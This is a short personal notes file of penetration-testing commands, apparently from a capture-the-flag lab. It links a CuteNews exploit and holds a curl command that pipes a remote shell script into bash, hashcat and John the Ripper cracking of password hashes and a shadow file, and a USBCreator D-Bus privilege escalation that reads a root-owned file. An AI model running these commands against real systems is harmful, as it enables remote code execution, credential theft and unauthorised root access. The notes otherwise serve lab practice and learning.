# notes & commands


## python cuteNews exploit
https://www.exploit-db.com/exploits/48800


## curl reverse shell call
`` curl 10.10.14.143/shell.txt | bash``

## crack with hashcat
``.\hashcat64.exe -m 1400 -w 3 hashes.txt .\rockyou.txt --outfile final.txt``


## USBCreator copy (priv escalation to root)
``gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /root.txt true``


## john cracking shadow file
``unshadow passwd shadow > unshadowed``

`` .\run\john.exe .\unshadowd.txt --wordlist=rockyou.txt``
